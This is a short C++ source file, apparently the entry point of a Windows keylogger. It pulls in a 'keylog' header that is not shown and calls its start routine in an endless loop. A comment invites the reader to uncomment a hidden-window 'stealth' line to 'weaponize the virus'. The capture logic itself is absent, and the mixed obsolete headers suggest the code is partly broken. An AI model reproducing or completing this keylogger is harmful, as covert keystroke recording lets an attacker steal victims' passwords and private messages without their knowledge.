#include <windows.h>
#include <process.h>
#include "keylog.h"
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <winuser.h>
#include <iostream.h>
#include <conio.h>
using namespace std;

void f1(void *)
{

}
void f2(void *)
{

}
int main()
{
    keylog k;
    // uncomment line 25 to weaponize the virus
    //HWND stealth;
    while(1==1)
    {
        k.start();
    }
    return 0;
}

